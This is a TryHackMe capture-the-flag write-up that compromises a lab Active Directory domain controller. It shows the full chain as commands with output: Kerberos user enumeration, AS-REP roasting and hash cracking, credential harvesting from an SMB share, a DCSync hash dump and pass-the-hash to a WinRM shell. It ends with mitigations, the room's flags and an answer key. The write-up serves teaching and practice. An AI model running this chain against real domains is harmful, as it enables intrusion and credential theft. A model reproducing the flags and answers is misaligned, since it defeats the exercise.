# AttacktiveDirectory - Full Penetration Test Writeup

## Executive Summary

**Target**: 10.64.132.240  
**Domain**: spookysec.local  
**Date**: 2026-02-04  
**Result**: Full Domain Compromise  
**Difficulty**: Easy  

This engagement demonstrates a complete Active Directory attack chain from initial reconnaissance to domain administrator access using AS-REP Roasting, credential harvesting, and DCSync attacks.

---

## Table of Contents

1. [Environment Setup](#1-environment-setup)
2. [Reconnaissance](#2-reconnaissance)
3. [Enumeration](#3-enumeration)
4. [Initial Access - AS-REP Roasting](#4-initial-access---as-rep-roasting)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Domain Compromise - DCSync](#6-domain-compromise---dcsync)
7. [Post-Exploitation](#7-post-exploitation)
8. [Flags](#8-flags)
9. [Credentials Summary](#9-credentials-summary)
10. [Lessons Learned](#10-lessons-learned)

---

## 1. Environment Setup

### 1.1 VPN Connection
```bash
# Connect to TryHackMe VPN
sudo openvpn your-config.ovpn
```

### 1.2 Verify Connection
```bash
ip addr show tun0 | grep inet
```
**Output**:
```
inet 192.168.172.208/17 brd 192.168.255.255 scope global tun0
```

### 1.3 Create Working Directory
```bash
mkdir -p /root/Documents/AttacktiveDirect/{scans,enumeration,creds,exploits,loot,notes}
echo "10.64.132.240" > /root/Documents/AttacktiveDirect/targets.txt
cd /root/Documents/AttacktiveDirect
```

### 1.4 Add to /etc/hosts (Optional)
```bash
echo "10.64.132.240 spookysec.local AttacktiveDirectory.spookysec.local" >> /etc/hosts
```

---

## 2. Reconnaissance

### 2.1 Full Port Scan
```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open -oA scans/full_scan 10.64.132.240
```

**Key Results**:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
49664-49703/tcp  open  msrpc  Microsoft Windows RPC
```

**RDP NTLM Info Extracted**:
```
Target_Name: THM-AD
NetBIOS_Domain_Name: THM-AD
NetBIOS_Computer_Name: ATTACKTIVEDIREC
DNS_Domain_Name: spookysec.local
DNS_Computer_Name: AttacktiveDirectory.spookysec.local
Product_Version: 10.0.17763
```

### 2.2 Target Identification

| Property | Value |
|----------|-------|
| IP Address | 10.64.132.240 |
| Hostname | AttacktiveDirectory.spookysec.local |
| Domain | spookysec.local |
| NetBIOS Domain | THM-AD |
| OS | Windows Server 2019 (Build 17763) |
| Role | Domain Controller |

---

## 3. Enumeration

### 3.1 SMB Enumeration with enum4linux

**Tool**: enum4linux (port 139/445)

```bash
enum4linux -a 10.64.132.240 | tee enumeration/enum4linux.txt
```

**Key Findings**:
```
[+] Server 10.64.132.240 allows sessions using username '', password ''
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

# RID Cycling Results:
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
```

**Domain SID**: `S-1-5-21-3591857110-2884097990-301047963`

### 3.2 LDAP Anonymous Bind Test
```bash
ldapsearch -x -H ldap://10.64.132.240 -b "DC=spookysec,DC=local" | tee enumeration/ldap_anon.txt
```

**Result**: Anonymous bind denied
```
result: 1 Operations error
text: In order to perform this operation a successful bind must be completed on the connection.
```

### 3.3 DNS Zone Transfer Attempt
```bash
dig @10.64.132.240 spookysec.local axfr | tee enumeration/dns_zone_transfer.txt
```

**Result**: Transfer failed

### 3.4 Kerberos User Enumeration with Kerbrute

**Install Kerbrute** (if not present):
```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute
```

**Enumerate Users**:
```bash
kerbrute userenum --dc 10.64.132.240 -d spookysec.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o enumeration/kerbrute_users.txt | tee enumeration/kerbrute_output.txt
```

**Valid Users Discovered**:
```
2026/02/04 04:23:14 >  [+] VALID USERNAME:       james@spookysec.local
2026/02/04 04:23:24 >  [+] VALID USERNAME:       robin@spookysec.local
2026/02/04 04:23:41 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/02/04 04:23:52 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/02/04 04:24:13 >  [+] VALID USERNAME:       backup@spookysec.local
2026/02/04 04:24:23 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/02/04 04:40:52 >  [+] VALID USERNAME:       ori@spookysec.local
```

### 3.5 Create Clean User List
```bash
cat > enumeration/users.txt << 'EOF'
administrator
backup
darkstar
james
ori
paradox
robin
svc-admin
EOF
```

**Note**: `svc-admin` was discovered through targeted guessing of common service account names.

### 3.6 Verify svc-admin Exists
```bash
crackmapexec smb 10.64.132.240 -u 'svc-admin' -p ''
```

**Output**:
```
SMB  10.64.132.240  445  ATTACKTIVEDIREC  [-] spookysec.local\svc-admin: STATUS_LOGON_FAILURE
```
Account exists (login failure, not "user not found").

---

## 4. Initial Access - AS-REP Roasting

### 4.1 Understanding AS-REP Roasting

AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled. These accounts return an encrypted TGT that can be cracked offline.

### 4.2 Execute AS-REP Roasting Attack
```bash
impacket-GetNPUsers spookysec.local/ -dc-ip 10.64.132.240 -usersfile enumeration/users.txt -format hashcat -outputfile creds/asrep_hashes.txt | tee enumeration/asrep_output.txt
```

**Output**:
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a08a1a27c6acd78729cfe212b7d3d647$bc499a55876f9c8fca5a724d5d0ecd7e09351703ea66ebde8d282e785464ee78aff30d9d65da9700197d95ca9f50bbc6cf1957305f313ea38d1250b994690564ea54272ef7f4a2a43f662e83c6c201f189b899333a2a48afea7d0de61e0fda1cbbcb513e094d7c2f87fed8db164ed81c18f4a286352e8fcaecbbb66e7e623bc4d0e3205d6790de7b2bbc2917ebb266aca74da393b31cb4f81aed3a14f1f7fed96a204e9847fca6cd81170d341f45a2488474461e2a62cf1052d5a872565c97b100d5caf3a859db1a306bff1773f19e62bd73c7ca3fc8fe8a3162d846b85ef92a00611ceaa069a905f08eda7cea5ad616250a
```

**VULNERABLE ACCOUNT FOUND**: `svc-admin`

### 4.3 View Captured Hash
```bash
cat creds/asrep_hashes.txt
```

**Hash Type**: Kerberos 5 AS-REP etype 23  
**Hashcat Mode**: 18200

### 4.4 Crack the Hash

**Method 1: John the Ripper** (Recommended)
```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt creds/asrep_hashes.txt
```

**Output**:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23)
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:06 DONE
Session completed.
```

**Method 2: Hashcat**
```bash
hashcat -m 18200 creds/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 4.5 First Credential Obtained

| Username | Password | Method |
|----------|----------|--------|
| svc-admin | management2005 | AS-REP Roasting |

```bash
echo "svc-admin:management2005" >> creds/credentials.txt
```

### 4.6 Verify Credentials
```bash
crackmapexec smb 10.64.132.240 -u 'svc-admin' -p 'management2005'
```

**Output**:
```
SMB  10.64.132.240  445  ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
```

✅ **CREDENTIALS VALID**

---

## 5. Privilege Escalation

### 5.1 Enumerate SMB Shares with Valid Credentials
```bash
crackmapexec smb 10.64.132.240 -u 'svc-admin' -p 'management2005' --shares
```

**Output**:
```
SMB  10.64.132.240  445  ATTACKTIVEDIREC  [+] Enumerated shares
SMB  10.64.132.240  445  ATTACKTIVEDIREC  Share           Permissions     Remark
SMB  10.64.132.240  445  ATTACKTIVEDIREC  -----           -----------     ------
SMB  10.64.132.240  445  ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB  10.64.132.240  445  ATTACKTIVEDIREC  backup          READ            
SMB  10.64.132.240  445  ATTACKTIVEDIREC  C$                              Default share
SMB  10.64.132.240  445  ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB  10.64.132.240  445  ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB  10.64.132.240  445  ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

**Interesting Share**: `backup` (READ access)

### 5.2 Enumerate Backup Share
```bash
smbclient //10.64.132.240/backup -U 'svc-admin%management2005' -c 'ls'
```

**Output**:
```
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
```

### 5.3 Download Credentials File
```bash
smbclient //10.64.132.240/backup -U 'svc-admin%management2005' -c 'get backup_credentials.txt loot/backup_credentials.txt'
```

### 5.4 Read File Contents
```bash
cat loot/backup_credentials.txt
```

**Output**:
```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

### 5.5 Decode Base64
```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

**Output**:
```
backup@spookysec.local:backup2517860
```

### 5.6 Second Credential Obtained

| Username | Password | Method |
|----------|----------|--------|
| backup | backup2517860 | SMB Share (base64 encoded) |

```bash
echo "backup:backup2517860" >> creds/credentials.txt
```

### 5.7 Verify Backup Credentials
```bash
crackmapexec smb 10.64.132.240 -u 'backup' -p 'backup2517860'
```

**Output**:
```
SMB  10.64.132.240  445  ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
```

✅ **CREDENTIALS VALID**

---

## 6. Domain Compromise - DCSync

### 6.1 Understanding DCSync

The `backup` account likely has domain replication privileges (commonly granted to backup service accounts). This allows us to perform a DCSync attack to extract all domain password hashes.

### 6.2 Execute DCSync Attack
```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.64.132.240 | tee loot/secretsdump.txt
```

**Output**:
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:5670ba569ea185b66c5c4265ee26df9d:::
```

### 6.3 Administrator NTLM Hash Obtained

| Account | NTLM Hash |
|---------|-----------|
| Administrator | 0e0363213e37b94221497260b0bcb4fc |
| krbtgt | 0e2eb8158c27bed09861033026be4c21 |
| a-spooks | 0e0363213e37b94221497260b0bcb4fc |

**Note**: `a-spooks` has the same hash as Administrator (same password or the same account).

---

## 7. Post-Exploitation

### 7.1 Pass-the-Hash Attack

Using the Administrator NTLM hash to gain shell access without knowing the password.

```bash
evil-winrm -i 10.64.132.240 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

**Output**:
```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

✅ **DOMAIN ADMINISTRATOR ACCESS ACHIEVED**

### 7.2 System Information
```powershell
*Evil-WinRM* PS> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763

*Evil-WinRM* PS> whoami /all
USER INFORMATION
----------------
User Name           SID
=================== =============================================
thm-ad\administrator S-1-5-21-3591857110-2884097990-301047963-500

GROUP INFORMATION
-----------------
...
BUILTIN\Administrators
THM-AD\Domain Admins
THM-AD\Enterprise Admins
...
```

### 7.3 List Users Directory
```powershell
*Evil-WinRM* PS> dir C:\Users

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                backup
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                svc-admin
```

---

## 8. Flags

### 8.1 svc-admin Flag
```powershell
*Evil-WinRM* PS> type C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```

### 8.2 backup Flag
```powershell
*Evil-WinRM* PS> type C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
```

### 8.3 Administrator Flag
```powershell
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

### 8.4 Flags Summary

| User | Flag Location | Flag |
|------|---------------|------|
| svc-admin | C:\Users\svc-admin\Desktop\user.txt.txt | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| backup | C:\Users\backup\Desktop\PrivEsc.txt | `TryHackMe{B4ckM3UpSc0tty!}` |
| Administrator | C:\Users\Administrator\Desktop\root.txt | `TryHackMe{4ctiveD1rectoryM4st3r}` |

---

## 9. Credentials Summary

### 9.1 Cleartext Credentials

| Username | Password | How Obtained |
|----------|----------|--------------|
| svc-admin | management2005 | AS-REP Roasting + Cracked |
| backup | backup2517860 | SMB share file (base64) |

### 9.2 NTLM Hashes (from DCSync)

| Account | RID | NTLM Hash |
|---------|-----|-----------|
| Administrator | 500 | 0e0363213e37b94221497260b0bcb4fc |
| Guest | 501 | 31d6cfe0d16ae931b73c59d7e0c089c0 |
| krbtgt | 502 | 0e2eb8158c27bed09861033026be4c21 |
| skidy | 1103 | 5fe9353d4b96cc410b62cb7e11c57ba4 |
| breakerofthings | 1104 | 5fe9353d4b96cc410b62cb7e11c57ba4 |
| james | 1105 | 9448bf6aba63d154eb0c665071067b6b |
| optional | 1106 | 436007d1c1550eaf41803f1272656c9e |
| sherlocksec | 1107 | b09d48380e99e9965416f0d7096b703b |
| darkstar | 1108 | cfd70af882d53d758a1612af78a646b7 |
| Ori | 1109 | c930ba49f999305d9c00a8745433d62a |
| robin | 1110 | 642744a46b9d4f6dff8942d23626e5bb |
| paradox | 1111 | 048052193cfa6ea46b5a302319c0cff2 |
| Muirland | 1112 | 3db8b1419ae75a418b3aa12b8c0fb705 |
| horshark | 1113 | 41317db6bd1fb8c21c2fd2b675238664 |
| svc-admin | 1114 | fc0f1e5359e372aa1f69147375ba6809 |
| backup | 1118 | 19741bde08e135f4b40f1ca9aab45538 |
| a-spooks | 1601 | 0e0363213e37b94221497260b0bcb4fc |
| ATTACKTIVEDIREC$ | 1000 | 5670ba569ea185b66c5c4265ee26df9d |

### 9.3 Kerberos Keys (from DCSync)

| Account | AES256-CTS-HMAC-SHA1-96 |
|---------|-------------------------|
| Administrator | 713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48 |
| krbtgt | b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc |

---

## 10. Lessons Learned

### 10.1 Vulnerabilities Exploited

1. **AS-REP Roasting (CVE-N/A)**
   - Account `svc-admin` had "Do not require Kerberos preauthentication" enabled
   - Weak password allowed offline cracking

2. **Insecure Credential Storage**
   - Plaintext credentials stored in SMB share (backup_credentials.txt)
   - Only base64 encoding (not encryption)

3. **Excessive Privileges**
   - Backup account had DCSync/domain replication rights
   - Allowed full domain hash extraction

### 10.2 Attack Chain Summary

```
Reconnaissance (Nmap)
         ↓
User Enumeration (Kerbrute)
         ↓
AS-REP Roasting (GetNPUsers) → svc-admin:management2005
         ↓
SMB Enumeration (CrackMapExec) → Found backup share
         ↓
Credential Harvesting → backup:backup2517860
         ↓
DCSync Attack (secretsdump) → All domain hashes
         ↓
Pass-the-Hash (Evil-WinRM) → DOMAIN ADMIN
```

### 10.3 Mitigations

| Vulnerability | Mitigation |
|--------------|------------|
| AS-REP Roasting | Disable "Do not require Kerberos preauthentication" |
| Weak Passwords | Enforce strong password policy (15+ chars) |
| Credential in Share | Never store credentials in plaintext; use vaults |
| Excessive Privileges | Follow principle of least privilege |
| DCSync Rights | Limit domain replication rights to DCs only |

### 10.4 Tools Used

| Tool | Purpose | Website |
|------|---------|---------|
| Nmap | Port scanning | https://nmap.org |
| enum4linux | SMB enumeration | Kali built-in |
| Kerbrute | Kerberos user enum | https://github.com/ropnop/kerbrute |
| Impacket | AD attacks | https://github.com/fortra/impacket |
| John the Ripper | Hash cracking | https://www.openwall.com/john |
| CrackMapExec | SMB/AD testing | https://github.com/byt3bl33d3r/CrackMapExec |
| smbclient | SMB client | Kali built-in |
| Evil-WinRM | WinRM shell | https://github.com/Hackplayers/evil-winrm |

---

## TryHackMe Question Answers

| Question | Answer |
|----------|--------|
| Tool for port 139/445 enumeration | enum4linux |
| NetBIOS-Domain Name | THM-AD |
| Invalid TLD commonly used for AD | .local |
| Kerbrute command for usernames | userenum |
| Notable account discovered (1) | svc-admin |
| Notable account discovered (2) | backup |
| User queryable without password | svc-admin |
| Kerberos hash type (full name) | Kerberos 5 AS-REP etype 23 |
| Hashcat mode | 18200 |
| svc-admin password | management2005 |
| Utility to map SMB shares | smbclient |
| Option to list shares | -L |
| Number of shares | 6 |
| Share with text file | backup |
| File contents (encoded) | YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw |
| Decoded contents | backup@spookysec.local:backup2517860 |
| Method to dump NTDS.DIT | DRSUAPI |
| Administrator NTLM hash | 0e0363213e37b94221497260b0bcb4fc |
| Attack without password | Pass the Hash |
| Evil-WinRM hash option | -H |
| svc-admin flag | TryHackMe{K3rb3r0s_Pr3_4uth} |
| backup flag | TryHackMe{B4ckM3UpSc0tty!} |
| Administrator flag | TryHackMe{4ctiveD1rectoryM4st3r} |

---

**Report Generated**: 2026-02-04  
**Author**: eligofman 
**Classification**: TryHackMe CTF Writeup
